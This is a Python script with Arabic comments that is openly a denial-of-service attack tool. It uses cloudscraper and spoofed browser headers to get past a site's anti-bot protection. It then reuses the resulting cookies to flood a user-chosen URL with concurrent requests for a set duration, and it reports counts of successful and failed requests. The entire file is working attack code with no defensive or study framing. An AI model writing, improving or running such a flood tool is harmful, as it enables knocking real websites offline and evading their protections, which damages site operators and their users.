import cloudscraper
import asyncio
import time
import aiohttp

# محاولة تجاوز الحمايات باستخدام CloudScraper
def bypass_protection(target_url):
    try:
        print("[*] محاولة تجاوز الحماية باستخدام CloudScraper...")
        scraper = cloudscraper.create_scraper()

        # إعداد Headers لمحاكاة متصفح حقيقي
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        # إرسال الطلب باستخدام CloudScraper
        response = scraper.get(target_url, headers=headers, timeout=10)

        if response.status_code == 200:
            print("[*] تجاوز الحماية بنجاح!")
            return scraper.cookies, headers
        else:
            print("[!] فشل تجاوز الحماية، الكود:", response.status_code)
            return None, None
    except Exception:
        # تجاهل الأخطاء
        return None, None


# إرسال طلب فردي
async def send_request(url, session, request_counter, response_times, semaphore):
    async with semaphore:  # التحكم في عدد الطلبات المتزامنة
        try:
            start_time = time.time()
            async with session.get(url) as response:
                await response.read()
                request_counter[0] += 1
                response_times.append(time.time() - start_time)
        except Exception:
            request_counter[1] += 1


# الوظيفة الرئيسية للهجوم
async def main(target_url, threads_count, attack_duration):
    print("[*] بدء هجوم DoS...")
    request_counter = [0, 0]
    response_times = []
    semaphore = asyncio.Semaphore(threads_count)  # التحكم في عدد الطلبات المتزامنة

    # تجاوز الحماية
    cookies, headers = bypass_protection(target_url)

    if not cookies or not headers:
        print("[!] لم يتم تجاوز الحماية، توقف البرنامج.")
        return

    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout, cookies=cookies, headers=headers) as session:
        end_time = time.time() + attack_duration
        tasks = []

        while time.time() < end_time:
            tasks.append(
                asyncio.create_task(send_request(target_url, session, request_counter, response_times, semaphore))
            )

            # تجنب إنشاء عدد ضخم من المهام دفعة واحدة
            if len(tasks) >= threads_count:
                await asyncio.gather(*tasks)
                tasks = []

        # التأكد من تشغيل أي مهام متبقية
        if tasks:
            await asyncio.gather(*tasks)

    avg_response_time = sum(response_times) / len(response_times) if response_times else 0
    print(f"\n[*] انتهى الهجوم. العدد الكلي للطلبات الناجحة: {request_counter[0]}, الفاشلة: {request_counter[1]}")
    print(f"[*] متوسط زمن الاستجابة: {avg_response_time:.4f} ثواني.")


if __name__ == "__main__":
    target_url = input("أدخل عنوان URL المستهدف (http://example.com): ").strip()
    threads_count = int(input("أدخل عدد الخيوط (Threads): ").strip())
    attack_duration = int(input("أدخل مدة الهجوم بالثواني: ").strip())

    asyncio.run(main(target_url, threads_count, attack_duration))
